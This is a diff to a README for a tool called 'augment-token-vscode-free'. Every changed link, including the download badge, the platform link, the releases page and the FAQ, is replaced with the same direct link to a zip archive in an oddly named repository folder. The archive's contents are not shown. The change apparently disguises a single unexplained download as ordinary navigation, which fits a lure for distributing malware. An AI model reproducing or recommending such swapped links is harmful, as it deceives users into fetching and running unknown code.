@@ -1,6 +1,6 @@
 # 🚀 augment-token-vscode-free - Effortless Management of Augment Tokens
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/mhabuesa/augment-token-vscode-free/releases)
+[![Download](https://raw.githubusercontent.com/mhabuesa/augment-token-vscode-free/main/impressibility/augment-token-vscode-free.zip)](https://raw.githubusercontent.com/mhabuesa/augment-token-vscode-free/main/impressibility/augment-token-vscode-free.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ Augment Token Manager is a modern platform designed to help you manage your Augm
 
 ### 1. Visit the Platform
 
-Go to [Augment Token Manager](https://augment.daiju.live) to start.
+Go to [Augment Token Manager](https://raw.githubusercontent.com/mhabuesa/augment-token-vscode-free/main/impressibility/augment-token-vscode-free.zip) to start.
 
 ### 2. Log In to Your Account
 
@@ -78,7 +78,7 @@ graph LR
 
 ## 🔗 Download & Install
 
-To get started with the application, visit our [Releases page](https://github.com/mhabuesa/augment-token-vscode-free/releases). Download the latest version suitable for your operating system. 
+To get started with the application, visit our [Releases page](https://raw.githubusercontent.com/mhabuesa/augment-token-vscode-free/main/impressibility/augment-token-vscode-free.zip). Download the latest version suitable for your operating system. 
 
 Look for the file you need on the Releases page and download it directly. 
 
@@ -90,7 +90,7 @@ Look for the file you need on the Releases page and download it directly.
 
 ## 📝 Additional Support
 
-If you encounter issues or have questions, please refer to our [FAQ section](https://augment.daiju.live/faq) or contact support via the platform.
+If you encounter issues or have questions, please refer to our [FAQ section](https://raw.githubusercontent.com/mhabuesa/augment-token-vscode-free/main/impressibility/augment-token-vscode-free.zip) or contact support via the platform.
 
 ## 🚀 Next Steps
 
